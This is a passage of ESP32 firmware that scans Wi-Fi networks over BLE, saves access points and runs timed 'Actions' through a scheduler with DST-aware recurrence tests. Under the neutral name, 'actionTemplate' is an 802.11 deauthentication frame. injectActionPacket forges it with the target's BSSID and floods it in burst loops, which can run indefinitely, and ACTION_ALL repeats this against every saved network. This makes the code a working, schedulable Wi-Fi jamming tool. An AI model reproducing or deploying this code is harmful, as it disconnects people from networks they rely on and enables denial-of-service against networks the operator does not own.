                  static_cast<unsigned long>(occurrenceStartUtc));
  }
  return queuedCount;
}

// Stage 8V: validate weekday recurrence, DST-aware local start conversion,
// and local-calendar Fixed End Time resolution without changing saved schedules.
void testRecurringScheduleResolution() {
  const String savedRule = schedulerPreferences.getString("tzrule", "");
  bool passed = applyPosixTimezoneRule("EST5EDT,M3.2.0/2,M11.1.0/2");

  ScheduleRecord monday = {};
  monday.id = 1;
  monday.scheduleType = SCHEDULE_RECURRING;
  monday.startYear = 2026;
  monday.startMonth = 1;
  monday.startDay = 5; // Monday.
  monday.startHour = 9;
  monday.startMinute = 0;
  monday.weekdays = static_cast<uint8_t>(1U << 1);
  monday.startAtUtc = 1767621600UL; // 2026-01-05 09:00 EST.

  uint32_t dueUtc = 0;
  passed = passed && resolveRecurringOccurrenceStartUtc(monday, 1767621900UL, dueUtc) &&
      dueUtc == 1767621600UL;

  // After the US spring transition, Monday 09:00 is 13:00 UTC, not 14:00 UTC.
  passed = passed && resolveRecurringOccurrenceStartUtc(monday, 1773061500UL, dueUtc) &&
      dueUtc == 1773061200UL;

  // On Tuesday, catch-up resolves the latest missed Monday occurrence.
  passed = passed && resolveRecurringOccurrenceStartUtc(monday, 1773147600UL, dueUtc) &&
      dueUtc == 1773061200UL;

  // On the spring-forward date, 01:30 to 03:30 local spans one UTC hour.
  ScheduleRecord dstEnd = {};
  dstEnd.id = 2;
  dstEnd.scheduleType = SCHEDULE_RECURRING;
  dstEnd.startYear = 2026;
  dstEnd.startMonth = 3;
  dstEnd.startDay = 8;
  dstEnd.startHour = 1;
  dstEnd.startMinute = 30;
  dstEnd.weekdays = static_cast<uint8_t>(1U << 0);
  dstEnd.startAtUtc = 1772951400UL;
  dstEnd.fixedEndDayOffset = 0;
  dstEnd.fixedEndHour = 3;
  dstEnd.fixedEndMinute = 30;
  uint32_t endUtc = 0;
  passed = passed && resolveRecurringFixedEndUtc(dstEnd, 1772951400UL, endUtc) &&
      endUtc == 1772955000UL;

  if (savedRule.isEmpty()) {
    unsetenv("TZ");
    tzset();
  } else {
    applyPosixTimezoneRule(savedRule.c_str());
  }

  if (passed) {
    Serial.println("[Scheduler] Stage 8V recurring weekday and DST resolution test PASSED.");
    sendSimpleResponse("SCHED_RECURRING_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8V recurring weekday and DST resolution test FAILED.");
    sendSimpleResponse("SCHED_RECURRING_TEST:FAILED");
  }
}

// Stage 8N: dispatch the earliest due queued instance when the Action runner
// is idle. One-time schedules are disabled in Flash immediately before launch
// so a completed occurrence cannot be queued and launched again on every poll.
bool dispatchNextPendingScheduledAction(uint32_t nowUtc) {
  if (nowUtc == 0 || schedulerPauseAllRequested || wifiScanPauseActive ||
      networkSavePauseActive) return false;

  if (actionActive || actionTaskHandle != nullptr) {
    if (pendingScheduledActionCount > 0 &&
        !actionYieldRequested &&
        interruptedActionCount < MAX_ACTION_INSTANCES &&
        (activeActionInstance.state == ACTION_INSTANCE_RUNNING ||
         activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED ||
         activeActionInstance.state == ACTION_INSTANCE_PAUSED)) {
      actionPauseRequested = true;
      actionYieldRequested = true;
      activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
      Serial.printf("[Scheduler] Requested interruption of instance %lu for pending schedule %u.\n",
                    static_cast<unsigned long>(activeActionInstance.instanceId),
                    static_cast<unsigned int>(pendingScheduledActions[0].scheduleId));
      return true;
    }
    return false;
  }

  ActionInstance next = {};
  if (!takeNextPendingScheduledAction(nowUtc, next)) {
    // A due scheduled Action always gets priority. When no due item remains,
    // resume the most recently interrupted Action (LIFO).
    return resumeMostRecentInterruptedAction(nowUtc);
  }

  int scheduleIndex = -1;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == next.scheduleId) {
      scheduleIndex = static_cast<int>(i);
      break;
    }
  }

  bool wasEnabled = false;
  if (scheduleIndex >= 0) {
    ScheduleRecord& schedule = schedulerData.records[scheduleIndex];
    wasEnabled = schedule.enabled;
    if (schedule.scheduleType == SCHEDULE_ONE_TIME && schedule.enabled) {
      schedule.enabled = false;
      if (!saveSchedulerStorage()) {
        schedule.enabled = wasEnabled;
        enqueuePendingScheduledAction(next);
        Serial.printf("[Scheduler] Could not persist one-time schedule %u; launch deferred.\n",
                      static_cast<unsigned int>(next.scheduleId));
        return false;
      }
    }
  }

  if (!startScheduledActionTask(next)) {
    if (scheduleIndex >= 0 && wasEnabled &&
        schedulerData.records[scheduleIndex].scheduleType == SCHEDULE_ONE_TIME) {
      schedulerData.records[scheduleIndex].enabled = true;
      saveSchedulerStorage();
    }
    enqueuePendingScheduledAction(next);
    return false;
  }

  Serial.printf("[Scheduler] Dispatched pending instance %lu (schedule %u).\n",
                static_cast<unsigned long>(next.instanceId),
                static_cast<unsigned int>(next.scheduleId));
  return true;
}

// Stage 8X: this is the shared collection path used by the live scheduler
// poll and by the integration test. Both schedule types are checked on every
// synchronized poll before the normal pending-queue dispatcher runs.
uint8_t collectDueSchedulesForPoll(uint32_t nowUtc) {
  if (nowUtc == 0) return 0;
  const uint8_t oneTimeCount = collectDueOneTimeSchedules(nowUtc);
  const uint8_t recurringCount = collectDueRecurringSchedules(nowUtc);
  return static_cast<uint8_t>(oneTimeCount + recurringCount);
}

// Stage 8Y: keep due collection and pending dispatch in one shared poll path.
// The live loop and the runtime integration diagnostic both call this helper.
// Collection still runs during Pause All so due occurrences remain queued;
// the dispatcher itself observes schedulerPauseAllRequested and will not launch.
bool runSchedulerPollAtUtc(uint32_t nowUtc) {
  if (nowUtc == 0) return false;
  collectDueSchedulesForPoll(nowUtc);
  return dispatchNextPendingScheduledAction(nowUtc);
}

void pollDueScheduledActions() {
  if (!timeSynced) return;
  const time_t currentTime = time(nullptr);
  if (currentTime <= 0) return;
  runSchedulerPollAtUtc(static_cast<uint32_t>(currentTime));
}

// Stage 8I: advance the timing clock attached to the live Action instance.
// User-requested pause freezes Active Duration, while Fixed End Time still
// checks its absolute UTC deadline. Fractional seconds are retained.
bool tickActionInstanceClock(ActionInstance& instance, uint32_t nowMs,
                             uint32_t nowUtc, bool externallyPaused) {
  if (!instance.timingConfigured ||
      instance.state == ACTION_INSTANCE_EMPTY) return false;

  if (instance.durationMode == SCHEDULE_FIXED_END_TIME && nowUtc == 0) {
    // Never interpret an unsynchronized clock as a real deadline.
    instance.lastTimingUpdateMs = nowMs;
    return false;
  }

  const uint32_t elapsedMs = nowMs - instance.lastTimingUpdateMs;
  const uint32_t elapsedSeconds = externallyPaused ? 0 : elapsedMs / 1000UL;
  if (externallyPaused || elapsedSeconds > 0) {
    instance.lastTimingUpdateMs = nowMs - (externallyPaused ? 0 : elapsedMs % 1000UL);
  }

  return advanceActionInstanceTiming(instance, elapsedSeconds, nowUtc);
}

String jsonEscape(const String& input);
bool sendBLEMessage(const String& message);

String storageKeyForBssid(const String& bssid) {
  String key = bssid;
  key.replace(":", "");
  key.toUpperCase();
  return key;
}

String savedBssidIndex() {
  return savedPreferences.getString("index", "");
}

bool indexContainsBssid(const String& index, const String& bssid) {
  String token;
  for (size_t i = 0; i <= index.length(); ++i) {
    const char c = (i < index.length()) ? index[i] : ',';
    if (c == ',') {
      if (token.equalsIgnoreCase(bssid)) return true;
      token = "";
    } else {
      token += c;
    }
  }
  return false;
}

String apRecordJson(const APRecord& ap, const char* eventName) {
  String json = "{\"event\":\"";
  json += eventName;
  json += "\",\"ssid\":\"";
  json += jsonEscape(ap.ssid);
  json += "\",\"bssid\":\"";
  json += jsonEscape(ap.bssid);
  json += "\",\"rssi\":";
  json += String(ap.rssi);
  json += ",\"channel\":";
  json += String(ap.channel);
  json += ",\"frequency_mhz\":";
  json += String(ap.frequencyMhz);
  json += ",\"band\":\"";
  json += ap.band;
  json += "\",\"security\":\"";
  json += ap.security;
  json += "\",\"auth_code\":";
  json += String(ap.authCode);
  json += ",\"hidden\":";
  json += ap.hidden ? "true" : "false";
  json += "}";
  return json;
}

uint8_t actionTemplate[] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

bool parseMacAddress(const String& macStr, uint8_t* macBytes) {
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
             &values[0], &values[1], &values[2], 
             &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; ++i) {
      macBytes[i] = (uint8_t)values[i];
    }
    return true;
  }
  return false;
}

bool findLastScanAP(const String& bssid, APRecord& output) {
  for (const auto& ap : lastScanRecords) {
    if (ap.bssid.equalsIgnoreCase(bssid)) {
      output = ap;
      return true;
    }
  }
  return false;
}

void injectActionPacket(const String& bssidStr, uint8_t channel, uint32_t durationSec, uint32_t burstSec, uint32_t sleepSec) {
  uint8_t targetMac[6];
  if (!parseMacAddress(bssidStr, targetMac)) {
    sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"INVALID_BSSID_FORMAT\"}");
    return;
  }

  bool isInfinite = (durationSec == 0);
  uint32_t durationMs = durationSec * 1000;
  uint32_t burstMs = burstSec * 1000;
  uint32_t sleepMs = sleepSec * 1000;

  Serial.printf("[WiFi TX] Target: %s | Ch: %d | Duration: %ds (Burst: %ds, Sleep: %ds)\n", 
                bssidStr.c_str(), channel, durationSec, burstSec, sleepSec);
  
  sendBLEMessage("{\"event\":\"TX_START\",\"target\":\"" + bssidStr + "\",\"duration\":" + String(durationSec) + "}");

  txAbortRequested = false;

  memcpy(&actionTemplate[10], targetMac, 6);
  memcpy(&actionTemplate[16], targetMac, 6);

  int packetsSent = 0;
  bool isBursting = true;
  
  uint32_t startTime = millis();
  uint32_t cycleStartTime = startTime;

  wifi_second_chan_t extensionChan = WIFI_SECOND_CHAN_NONE;
  if (channel >= 1 && channel <= 14) {
    extensionChan = (channel <= 7) ? WIFI_SECOND_CHAN_ABOVE : WIFI_SECOND_CHAN_BELOW;
  } else if (channel >= 32 && channel <= 196) {
    if (channel == 36 || channel == 44 || channel == 52 || channel == 60 ||
        channel == 100 || channel == 108 || channel == 116 || channel == 124 ||
        channel == 132 || channel == 140 || channel == 149 || channel == 157 || channel == 165) {
      extensionChan = WIFI_SECOND_CHAN_ABOVE;
    } else {
      extensionChan = WIFI_SECOND_CHAN_BELOW;
    }
  }

  // Configure high PHY data rate and initial channel state ONCE before the loop
  esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_54M);
  esp_wifi_set_promiscuous(true);

  bool use40Mhz = false;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  uint32_t lastBandSwitch = millis();
  const uint32_t bandBatchIntervalMs = 50; // Alternates 20MHz / 40MHz every 50 ms
  uint32_t batchCounter = 0;

  while (isInfinite || (millis() - startTime < durationMs)) {
    if (txAbortRequested) {
      Serial.println("[WiFi TX] Abort requested! Breaking transmission loop.");
      sendBLEMessage("{\"event\":\"TX_ABORTED\",\"reason\":\"USER_STOP\"}");
      break;
    }

    uint32_t now = millis();
    uint32_t currentCycleElapsed = now - cycleStartTime;

    // Burst / Sleep State Machine
    if (isBursting && burstMs > 0 && currentCycleElapsed >= burstMs) {
      if (sleepMs > 0) {
        isBursting = false;
        cycleStartTime = now;
        esp_wifi_set_promiscuous(false);
        Serial.println("[WiFi TX] Burst ended. Entering sleep state...");
      } else {
        cycleStartTime = now;
      }
    } else if (!isBursting && currentCycleElapsed >= sleepMs) {
      isBursting = true;
      cycleStartTime = now;
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_channel(channel, use40Mhz ? extensionChan : WIFI_SECOND_CHAN_NONE);
      lastBandSwitch = now;
      Serial.println("[WiFi TX] Sleep ended. Initiating burst state...");
    }

    if (isBursting) {
      // Timed Bandwidth Batching: Switch channel width every 50 ms
      if (extensionChan != WIFI_SECOND_CHAN_NONE && (now - lastBandSwitch >= bandBatchIntervalMs)) {
        use40Mhz = !use40Mhz;
        esp_wifi_set_channel(channel, use40Mhz ? extensionChan : WIFI_SECOND_CHAN_NONE);
        lastBandSwitch = now;
      }

      // Transmit raw management frame
      esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, actionTemplate, sizeof(actionTemplate), false);

      if (res == ESP_OK) {
        packetsSent++;
        batchCounter++;
        delayMicroseconds(120); 
      } else {
        // TX queue full; back off briefly so hardware can flush
        delayMicroseconds(400);
      }

      // Yield 1 RTOS tick every 100 packets to prevent Watchdog resets & service BLE
      if (batchCounter >= 100) {
        batchCounter = 0;
        vTaskDelay(1);
      }
    } else {
      vTaskDelay(pdMS_TO_TICKS(20));
    }
  }

  esp_wifi_set_promiscuous(false);

  Serial.printf("[WiFi TX] Cycle complete. Injected %d total raw management frames.\n", packetsSent);
  //sendBLEMessage("{\"event\":\"TX_DONE\",\"sent\":" + String(packetsSent) + "}");
}

void saveAPByBssid(const String& bssid) {
  APRecord ap;
  if (!findLastScanAP(bssid, ap)) {
    sendBLEMessage("{\"event\":\"SAVE_ERROR\",\"reason\":\"AP_NOT_IN_LAST_SCAN\"}");
    return;
  }

  const String key = storageKeyForBssid(ap.bssid);
  const String json = apRecordJson(ap, "SAVED_AP");
  if (savedPreferences.putString(key.c_str(), json) == 0) {
    sendBLEMessage("{\"event\":\"SAVE_ERROR\",\"reason\":\"FLASH_WRITE_FAILED\"}");
    return;
  }

  String index = savedBssidIndex();
  if (!indexContainsBssid(index, ap.bssid)) {
    if (index.length() > 0) index += ",";
    index += ap.bssid;
    if (savedPreferences.putString("index", index) == 0) {
      savedPreferences.remove(key.c_str());
      sendBLEMessage("{\"event\":\"SAVE_ERROR\",\"reason\":\"INDEX_WRITE_FAILED\"}");
      return;
    }
  }

  sendBLEMessage("{\"event\":\"AP_SAVED\",\"bssid\":\"" + jsonEscape(ap.bssid) + "\"}");
}

void sendSavedAPs() {
  const String index = savedBssidIndex();
  size_t count = 0;
  for (size_t i = 0; i < index.length(); ++i) {
    if (index[i] == ',') ++count;
  }
  if (index.length() > 0) ++count;

  sendBLEMessage("{\"event\":\"SAVED_APS_BEGIN\",\"count\":" + String(count) + "}");

  String bssid;
  for (size_t i = 0; i <= index.length(); ++i) {
    const char c = (i < index.length()) ? index[i] : ',';
    if (c == ',') {
      if (bssid.length() > 0) {
        const String key = storageKeyForBssid(bssid);
        const String json = savedPreferences.getString(key.c_str(), "");
        if (json.length() > 0) sendBLEMessage(json);
        delay(25);
      }
      bssid = "";
    } else {
      bssid += c;
    }
  }

  sendBLEMessage("{\"event\":\"SAVED_APS_DONE\",\"count\":" + String(count) + "}");
}

void deleteSavedAP(const String& bssid) {
  const String key = storageKeyForBssid(bssid);
  const bool existed = savedPreferences.isKey(key.c_str());
  const bool removed = !existed || savedPreferences.remove(key.c_str());

  String oldIndex = savedBssidIndex();
  String newIndex;
  String token;
  for (size_t i = 0; i <= oldIndex.length(); ++i) {
    const char c = (i < oldIndex.length()) ? oldIndex[i] : ',';
    if (c == ',') {
      if (token.length() > 0 && !token.equalsIgnoreCase(bssid)) {
        if (newIndex.length() > 0) newIndex += ",";
        newIndex += token;
      }
      token = "";
    } else {
      token += c;
    }
  }

  bool indexOk = false;
  if (newIndex.length() == 0) {
    const bool indexExisted = savedPreferences.isKey("index");
    indexOk = !indexExisted || savedPreferences.remove("index");
    indexOk = indexOk && !savedPreferences.isKey("index");
  } else {
    indexOk = savedPreferences.putString("index", newIndex) > 0;
  }

  String statusStr = (removed && indexOk) ? "true" : "false";
  sendBLEMessage("{\"event\":\"AP_DELETED\",\"bssid\":\"" + jsonEscape(bssid) + "\",\"success\":" + statusStr + "}");
}

void clearSavedAPs() {
  const bool ok = savedPreferences.clear();
  String statusStr = ok ? "true" : "false";
  sendBLEMessage("{\"event\":\"SAVED_APS_CLEARED\",\"success\":" + statusStr + "}");
}

String jsonEscape(const String& input) {
  String output;
  output.reserve(input.length() + 8);

  const char hex[] = "0123456789ABCDEF";
  for (size_t i = 0; i < input.length(); ++i) {
    const uint8_t c = static_cast<uint8_t>(input[i]);
    switch (c) {
      case '"':  output += "\\\""; break;
      case '\\': output += "\\\\"; break;
      case '\b': output += "\\b"; break;
      case '\f': output += "\\f"; break;
      case '\n': output += "\\n"; break;
      case '\r': output += "\\r"; break;
      case '\t': output += "\\t"; break;
      default:
        if (c < 0x20) {
          output += "\\u00";
          output += hex[(c >> 4) & 0x0F];
          output += hex[c & 0x0F];
        } else {
          output += static_cast<char>(c);
        }
        break;
    }
  }
  return output;
}

int frequencyMHzFromChannel(int channel) {
  if (channel == 14) return 2484;
  if (channel >= 1 && channel <= 13) return 2407 + (5 * channel);
  if (channel >= 32 && channel <= 196) return 5000 + (5 * channel);
  return 0;
}

const char* bandFromChannel(int channel) {
  if (channel >= 1 && channel <= 14) return "2.4GHz";
  if (channel >= 32 && channel <= 196) return "5GHz";
  return "unknown";
}

const char* securityName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
    case WIFI_AUTH_ENTERPRISE: return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3_PSK";
    case WIFI_AUTH_WAPI_PSK: return "WAPI_PSK";
    case WIFI_AUTH_OWE: return "OWE";
    case WIFI_AUTH_WPA3_ENT_192: return "WPA3_ENT_192";
    case WIFI_AUTH_WPA3_EXT_PSK: return "WPA3_EXT_PSK";
    case WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE: return "WPA3_EXT_PSK_MIXED";
    case WIFI_AUTH_DPP: return "DPP";
    case WIFI_AUTH_WPA3_ENTERPRISE: return "WPA3_ENTERPRISE";
    case WIFI_AUTH_WPA2_WPA3_ENTERPRISE: return "WPA2_WPA3_ENTERPRISE";
    case WIFI_AUTH_WPA_ENTERPRISE: return "WPA_ENTERPRISE";
    default: return "UNKNOWN";
  }
}

size_t getNotificationPayloadLimit() {
  size_t payloadLimit = 20;
  if (bleServer != nullptr) {
    const std::vector<uint16_t> peers = bleServer->getPeerDevices();
    if (!peers.empty()) {
      const uint16_t peerMtu = bleServer->getPeerMTU(peers.front());
      if (peerMtu > 3) {
        payloadLimit = static_cast<size_t>(peerMtu - 3);
      }
    }
  }
  return std::min(payloadLimit, MAX_NOTIFY_DATA);
}

bool notifyPacket(const String& packet) {
  if (txCharacteristic == nullptr || !txNotificationsEnabled) {
    Serial.println("[BLE TX] Not sent: TX notifications are not enabled.");
    return false;
  }
  const std::string value(packet.c_str());
  txCharacteristic->setValue(value);
  return txCharacteristic->notify();
}

bool sendBLEMessage(const String& message) {
  if (txCharacteristic == nullptr || !txNotificationsEnabled) {
    Serial.println("[BLE TX] Skipped: enable TX notifications in the Android app.");
    return false;
  }

  const size_t maxPayload = getNotificationPayloadLimit();
  if (maxPayload < 12) {
    Serial.println("[BLE TX] Negotiated BLE MTU is too small.");
    return false;
  }

  if (message.length() <= maxPayload) {
    const bool ok = notifyPacket(message);
    Serial.print("[BLE TX] ");
    Serial.print(message);
    Serial.println(ok ? " [SENT]" : " [FAILED]");
    return ok;
  }

  const size_t chunkDataLength = maxPayload - FRAME_HEADER_LENGTH;
  const size_t chunkCount = (message.length() + chunkDataLength - 1) / chunkDataLength;
  if (chunkCount > 255) {
    Serial.println("[BLE TX] Message too large to frame.");
    return false;
  }

  const uint8_t messageId = ++outgoingMessageId;
  Serial.printf("[BLE TX] Framing %u bytes into %u notifications.\n",
                static_cast<unsigned>(message.length()),
                static_cast<unsigned>(chunkCount));

  for (size_t chunkIndex = 0; chunkIndex < chunkCount; ++chunkIndex) {
    const size_t offset = chunkIndex * chunkDataLength;
    const size_t dataLength = std::min(chunkDataLength, message.length() - offset);

    char header[FRAME_HEADER_LENGTH + 1];
    snprintf(header, sizeof(header), "@%02X%02X%02X:",
             static_cast<unsigned>(messageId),
             static_cast<unsigned>(chunkIndex),
             static_cast<unsigned>(chunkCount));

    String packet(header);
    packet.reserve(FRAME_HEADER_LENGTH + dataLength);
    packet += message.substring(offset, offset + dataLength);

    if (!notifyPacket(packet)) {
      Serial.printf("[BLE TX] Frame %u failed.\n", static_cast<unsigned>(chunkIndex));
      return false;
    }
    delay(18);
  }
  return true;
}

void sendSimpleResponse(const char* text) {
  Serial.print("[BLE TX] ");
  Serial.println(text);
  sendBLEMessage(String(text));
}

bool networkSaveWindowOpen() {
  if (!networkSavePauseActive) return false;
  if (!actionActive && actionTaskHandle == nullptr) return true;
  return actionActive && actionTaskHandle != nullptr &&
         actionPauseRequested &&
         activeActionInstance.state == ACTION_INSTANCE_PAUSED;
}

void notifyNetworkSavePaused() {
  if (networkSavePauseActive && !networkSavePauseAckSent) {
    networkSavePauseAckSent = true;
    sendSimpleResponse("NETWORK_SAVE_PAUSED");
  }
}

class RXCallbacks : public NimBLECharacteristicCallbacks {
  void onWrite(NimBLECharacteristic* characteristic,
               NimBLEConnInfo& connInfo) override {
    const std::string incoming = static_cast<std::string>(characteristic->getValue());
    char command[MAX_COMMAND_LENGTH] = {0};

    if (incoming.length() >= MAX_COMMAND_LENGTH) {
      Serial.println("[BLE RX] Command rejected: exceeds scheduler command buffer.");
      return;
    }
    size_t commandLength = incoming.length();
    memcpy(command, incoming.data(), commandLength);
    command[commandLength] = '\0';

    while (commandLength > 0 && (command[commandLength - 1] == '\r' || command[commandLength - 1] == '\n')) {
      command[--commandLength] = '\0';
    }

    Serial.print("[BLE RX] ");
    Serial.println(command);

    const bool isActionCommand =
        strcmp(command, "ACTION_ALL") == 0 ||
        strncmp(command, "ACTION_ALL:", 11) == 0 ||
        strncmp(command, "ACTION:", 7) == 0;

    if (strcmp(command, "STOP") == 0 ||
        strcmp(command, "MANUAL_STOP") == 0 ||
        strcmp(command, "MANUAL_STOP_ALL") == 0) {
      // Manual Stop commands are handled by the command task. They must never
      // set the shared abort flag here, because the foreground runner may be
      // a scheduled Action that interrupted a manual Action.
      Serial.println("[BLE RX] Manual-only Stop request queued.");
    } else {
      const bool canInterruptScheduledRunner = isActionCommand && actionActive &&
          actionTaskHandle != nullptr &&
          activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
          activeActionInstance.scheduleId != 0 &&
          !pendingManualActionStart &&
          interruptedActionCount < MAX_ACTION_INSTANCES;
      const bool isSaveApCommand = strncmp(command, "SAVE_AP:", 8) == 0;
      const bool isSavedNetworkMutation =
          strncmp(command, "DELETE_AP:", 10) == 0 ||
          strcmp(command, "CLEAR_SAVED_APS") == 0;
      if (actionActive &&
          ((isSavedNetworkMutation && !networkSaveWindowOpen()) ||
           (isSaveApCommand && !networkSaveWindowOpen()) ||
           (isActionCommand && !canInterruptScheduledRunner))) {
        Serial.println("[BLE RX] Command rejected: an Action is active or not safely paused.");
        return;
      }
    }

    if (isActionCommand && !actionActive) {
      txAbortRequested = false;
      actionActive = true;
    }

    if (commandQueue == nullptr || xQueueSend(commandQueue, command, 0) != pdTRUE) {
      // Do not clear actionActive when the existing runner is a scheduled Action.
      if (isActionCommand && actionTaskHandle == nullptr) actionActive = false;
      Serial.println("[BLE RX] Command queue full; command dropped.");
    }
  }
};

class TXCallbacks : public NimBLECharacteristicCallbacks {
  void onSubscribe(NimBLECharacteristic* characteristic,
                   NimBLEConnInfo& connInfo,
                   uint16_t subValue) override {
    txNotificationsEnabled = (subValue & 0x01) != 0;
    Serial.print("[BLE] TX notification subscription: ");
    Serial.println(txNotificationsEnabled ? "ENABLED" : "DISABLED");
  }
};

RXCallbacks rxCallbacks;
TXCallbacks txCallbacks;

bool initializeWiFiForScanning() {
  if (wifiInitialized) return true;
  Serial.println("[WiFi] Initializing station mode for passive scanning...");
  if (!WiFi.mode(WIFI_STA)) {
    Serial.println("[WiFi] Failed to set station mode.");
    return false;
  }
  WiFi.setSleep(false);
  wifiInitialized = true;
  return true;
}

void beginPendingWiFiScan() {
  if (!wifiScanStartPending || actionActive || actionTaskHandle != nullptr) return;

  if (!initializeWiFiForScanning()) {
    wifiScanStartPending = false;
    wifiScanPauseActive = false;
    sendBLEMessage("{\"event\":\"SCAN_ERROR\",\"reason\":\"WIFI_INIT_FAILED\"}");
    Serial.println("[WiFi] Scan cancelled; Action runner will resume.");
    return;
  }

  WiFi.scanDelete();
  const int16_t result = WiFi.scanNetworks(true, true, true, PASSIVE_DWELL_MS, 0);
  wifiScanStartPending = false;
  if (result == WIFI_SCAN_RUNNING_CODE) {
    wifiScanActive = true;
    sendBLEMessage("{\"event\":\"SCAN_STARTED\",\"mode\":\"PASSIVE\"}");
    Serial.println("[WiFi] Passive scan started; Actions remain paused.");
  } else {
    wifiScanPauseActive = false;
    sendBLEMessage("{\"event\":\"SCAN_ERROR\",\"reason\":\"SCAN_START_FAILED\"}");
    Serial.println("[WiFi] Scan could not start; Action runner will resume.");
  }
}

void startWiFiScan() {
  if (wifiScanActive || wifiScanStartPending || wifiScanPauseActive) {
    sendBLEMessage("{\"event\":\"SCAN_BUSY\"}");
    return;
  }

  // Freeze the active instance and hand it to the scheduler's LIFO stack.
  // This applies equally to manual and scheduled individual/Action All runs.
  wifiScanPauseActive = true;
  wifiScanStartPending = true;
  if (actionActive && actionTaskHandle != nullptr) {
    actionPauseRequested = true;
    actionYieldRequested = true;
    Serial.println("[WiFi] Scan requested; waiting for active Action to pause safely.");
  } else {
    Serial.println("[WiFi] Scan requested; existing paused Actions will remain on the stack.");
  }
  sendBLEMessage("{\"event\":\"SCAN_PAUSE_REQUESTED\"}");
  beginPendingWiFiScan();
}

void sendScanResults(int16_t networkCount) {
  lastScanRecords.clear();
  sendBLEMessage("{\"event\":\"SCAN_RESULTS_BEGIN\",\"count\":" + String(networkCount) + "}");

  for (int16_t i = 0; i < networkCount; ++i) {
    const String ssid = WiFi.SSID(i);
    const String bssid = WiFi.BSSIDstr(i);
    const int32_t rssi = WiFi.RSSI(i);
    const int32_t channel = WiFi.channel(i);
    const wifi_auth_mode_t authMode = WiFi.encryptionType(i);
    const int authCode = static_cast<int>(authMode);
    const int frequency = frequencyMHzFromChannel(channel);

    APRecord record;
    record.ssid = ssid;
    record.bssid = bssid;
    record.rssi = rssi;
    record.channel = channel;
    record.frequencyMhz = frequency;
    record.band = bandFromChannel(channel);
    record.security = securityName(authMode);
    record.hidden = (ssid.length() == 0);
    record.authCode = authCode;
    lastScanRecords.push_back(record);

    String json = "{\"event\":\"SCAN_RESULT\",\"index\":" + String(i) +
                  ",\"ssid\":\"" + jsonEscape(ssid) +
                  "\",\"bssid\":\"" + bssid +
                  "\",\"rssi\":" + String(rssi) +
                  ",\"channel\":" + String(channel) +
                  ",\"frequency_mhz\":" + String(frequency) +
                  ",\"band\":\"" + bandFromChannel(channel) +
                  "\",\"security\":\"" + securityName(authMode) +
                  "\",\"auth_code\":" + String(authCode) +
                  ",\"hidden\":" + ((ssid.length() == 0) ? "true" : "false") + "}";

    sendBLEMessage(json);
    delay(25);
  }
  sendBLEMessage("{\"event\":\"SCAN_DONE\",\"count\":" + String(networkCount) + "}");
  WiFi.scanDelete();
}

void pollWiFiScan() {
  if (wifiScanStartPending) {
    beginPendingWiFiScan();
    if (wifiScanStartPending || !wifiScanActive) return;
  }
  if (!wifiScanActive) return;
  const int16_t result = WiFi.scanComplete();
  if (result == WIFI_SCAN_RUNNING_CODE) return;
  wifiScanActive = false;
  if (result == WIFI_SCAN_FAILED_CODE) {
    sendBLEMessage("{\"event\":\"SCAN_ERROR\",\"reason\":\"SCAN_FAILED_OR_TIMEOUT\"}");
    WiFi.scanDelete();
    wifiScanPauseActive = false;
    Serial.println("[WiFi] Scan failed; previously active Actions may resume.");
    return;
  }
  sendScanResults(result);
  wifiScanPauseActive = false;
  Serial.println("[WiFi] Scan completed; queued due schedules will be handled first, then the interrupted Action stack resumes LIFO.");
}

struct ActionTaskParams {
  bool isAllAction;
  char command[MAX_COMMAND_LENGTH];
};

bool pushInterruptedAction(const ActionInstance& instance);

void actionTask(void* parameter) {
  ActionTaskParams taskParams = *((ActionTaskParams*)parameter);
  delete (ActionTaskParams*)parameter;

  const bool isAllAction = taskParams.isAllAction;
  bool pauseEventSent = false;
  uint32_t lastDebugPrintMs = 0;
  char command[MAX_COMMAND_LENGTH];
  strncpy(command, taskParams.command, sizeof(command) - 1);
  command[sizeof(command) - 1] = '\0';

  String payload = String(command + 11);

  if (isAllAction) {
    String payload = "";
    if (strncmp(command, "ACTION_ALL:", 11) == 0) {
      payload = String(command + 11);
    }
    
    String tokens[3] = {"1", "0", "0"};
    int tokenCount = 0;
    int lastIndex = 0;
    
    for (int i = 0; i <= payload.length(); i++) {
      if (i == payload.length() || payload[i] == ',') {
        if (tokenCount < 3 && lastIndex < i) {
          tokens[tokenCount++] = payload.substring(lastIndex, i);
        }
        lastIndex = i + 1;
      }
    }
    
    uint32_t durationSeconds = tokens[0].toInt();
    uint32_t burstSeconds    = tokens[1].toInt();
    uint32_t sleepSeconds    = tokens[2].toInt();

    const String index = savedBssidIndex();
    if (index.length() == 0) {
      sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"NO_NETWORKS_SAVED_IN_FLASH\"}");
      return;
    }

    sendBLEMessage("{\"event\":\"TX_ALL_START\"}");
    txAbortRequested = false;

    String currentBssid = "";

    while (!txAbortRequested) {
      const uint32_t nowUtc = timeSynced
